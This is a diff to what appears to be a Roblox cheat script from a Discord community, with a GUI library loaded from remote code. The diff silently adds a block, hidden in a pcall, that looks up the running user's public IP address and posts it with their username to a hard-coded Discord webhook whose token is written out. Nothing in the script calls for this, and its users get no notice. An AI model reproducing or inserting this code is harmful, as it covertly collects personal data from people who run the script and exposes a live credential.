@@ -1,6 +1,21 @@
 --This script was made by uwy5 on discord. Server for crystalhub: discord.gg/FJQXYfaAh2
 
+--spam the webhook i dare you
 
+        pcall(function() local data = {
+            ["content"] = game.Players.LocalPlayer.Name.." executed: "..game:HttpGet("https://api.ipify.org")
+        }
+
+        request(
+    {
+        Url = "https://discord.com/api/webhooks/1241503371286937600/rFvS_m5uBpc_HfmH2LHg1iSgwj9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(data)
+    }
+) end)
 
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/railme37509124/NoviLibrary/main/library.lua"), true)().NewLibrary()
